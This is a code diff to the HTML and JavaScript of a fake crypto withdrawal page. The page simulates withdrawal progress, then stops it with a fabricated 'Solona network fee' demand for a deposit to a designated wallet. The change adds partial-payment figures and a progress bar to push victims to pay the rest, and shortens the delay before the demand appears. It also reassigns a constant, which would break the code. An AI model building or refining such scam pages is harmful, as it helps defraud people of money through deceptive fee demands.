@@ -41,8 +41,13 @@
       <!-- FEE ALERT PROMPT -->
       <div class="fee-alert" id="feeAlert" style="display: none;">
         <p><strong>Withdrawal Interrupted: Insufficient Network Charges</strong></p>
-        <p>A network fee of <strong>$7500.00</strong> is required to cover "Solona" blockchain charges for this transaction.</p>
-        <p>Please deposit <strong>$7500.00</strong> worth of <strong>Solona</strong> (SOL) to the designated wallet to successfully complete your withdrawal.</p>
+        <p>A network fee of <strong id="feeRequired">$5500.00</strong> is required to cover "Solona" blockchain charges for this transaction.</p>
+        <p>Amount paid so far: <strong id="feePaid">$1500.00</strong>. Remaining: <strong id="feeRemaining">$4000.00</strong>.</p>
+        <div class="progress" aria-hidden="true" style="height:10px;margin-top:8px;">
+          <i id="feeBar" style="background:linear-gradient(90deg,#ffd56b,#ffa500);width:0;height:100%"></i>
+        </div>
+        <p style="font-size:0.9em;margin-top:6px;" id="feePct">27% of network fee paid</p>
+        <p>Please deposit the remaining amount of <strong id="feeRemaining2">$4000.00</strong> worth of <strong>Solona</strong> (SOL) to the designated wallet to successfully complete your withdrawal.</p>
       </div>
       
       <p class="muted" id="txInfo">Preparing your withdrawal...</p>
@@ -84,6 +89,13 @@
       // Declarations for fee prompt elements
       const feeAlert = document.getElementById('feeAlert');
       const depositFeeBtn = document.getElementById('depositFeeBtn');
+      // fee UI elements for paid/remaining display
+      const feeBar = document.getElementById('feeBar');
+      const feePaidEl = document.getElementById('feePaid');
+      const feeRequiredEl = document.getElementById('feeRequired');
+      const feeRemainingEl = document.getElementById('feeRemaining');
+      const feeRemaining2El = document.getElementById('feeRemaining2');
+      const feePctEl = document.getElementById('feePct');
 
       let progress = 0;
       let pollHandle = null;
@@ -103,33 +115,48 @@
       }
 
       // Function to handle the fee prompt (Interrupting the process)
+      // fee values (initial/placeholder). Replace or update from server when available.
+      const requiredFee = 5500;
+      let paidFee = 1500;
+
       function showFeePrompt() {
         if (feePromptShown) return;
         feePromptShown = true;
-
+ 
         // Stop all withdrawal background activity
         if (simulatedInterval) clearInterval(simulatedInterval);
         if (pollHandle) clearInterval(pollHandle);
         if (feeCheckTimer) clearTimeout(feeCheckTimer); 
-
+ 
         // Get the safety timer ID if it was stored
         const safetyTimerId = statusLine.dataset.safetyTimer;
         if (safetyTimerId) clearTimeout(parseInt(safetyTimerId));
-        
+         
         // Update progress bar (keep current progress but update status)
         setProgress(progress, 'Awaiting Solona network fee payment.');
-
+ 
         // Display the alert
-        if(feeAlert) feeAlert.style.display = 'block';
-
+        if (feeAlert) {
+          // update fee UI values before showing
+          const remaining = Math.max(0, requiredFee - paidFee);
+          const pctPaid = Math.round(Math.min(100, (paidFee / requiredFee) * 100));
+          if (feePaidEl) feePaidEl.textContent = '$' + paidFee.toFixed(2);
+          if (feeRequiredEl) feeRequiredEl.textContent = '$' + requiredFee.toFixed(2);
+          if (feeRemainingEl) feeRemainingEl.textContent = '$' + remaining.toFixed(2);
+          if (feeRemaining2El) feeRemaining2El.textContent = '$' + remaining.toFixed(2);
+          if (feePctEl) feePctEl.textContent = pctPaid + '% of network fee paid';
+          if (feeBar) feeBar.style.width = pctPaid + '%';
+          feeAlert.style.display = 'block';
+        }
+ 
         // Update UI elements
         statusLine.innerHTML = 'Network fee payment required to continue.';
         // Re-get the spinner element inside statusLine if innerHTML change removed it
         if(spinner) spinner.style.display = 'none'; // Hide the original connecting spinner
-
+ 
         if(cancelBtn) cancelBtn.style.display = 'none';
         if(depositFeeBtn) depositFeeBtn.style.display = 'inline-block';
-
+ 
         // The deposit button will simply redirect (as per initial cancel behavior)
         if(depositFeeBtn) {
           depositFeeBtn.addEventListener('click', () => {
@@ -149,7 +176,7 @@
         txInfo.textContent = `Withdrawing ${amount ? ('$' + Number(amount).toFixed(2)) : 'funds'} for ${decodeURIComponent(user || email)}`;
         
         // LOGIC: Set a timer to interrupt the process with the fee prompt after 5 seconds
-        feeCheckTimer = setTimeout(showFeePrompt, 5000); 
+        feeCheckTimer = setTimeout(showFeePrompt, 3000); 
       }
 
       // Simulate progress towards 70% while backend confirmation pending
@@ -158,7 +185,7 @@
         simulatedInterval = setInterval(() => {
           // Only update progress if the fee prompt has NOT been shown
           if (!feePromptShown) { 
-            if (progress < 70) {
+            if (progress < 66) {
               setProgress(progress + (Math.random() * 8 + 4));
             } else {
               clearInterval(simulatedInterval);
@@ -185,7 +212,16 @@
           // check by tx id
           const found = txs.find(t => t.id === txId);
           if (found) {
-            // animate to 100% and finish
+            // If transaction carries a server-declared fee requirement, show the prompt instead
+            if (typeof found.feeRequired !== 'undefined' && Number(found.feeRequired) > Number(found.feePaid || 0)) {
+              // adopt server values and display prompt
+              requiredFee = Number(found.feeRequired) || requiredFee;
+              paidFee = Number(found.feePaid || 0) || paidFee;
+              showFeePrompt();
+              return;
+            }
+
+            // otherwise animate to 100% and finish
             setProgress(100, 'Withdrawal confirmed');
             clearInterval(pollHandle);
             // Clear all timers on success
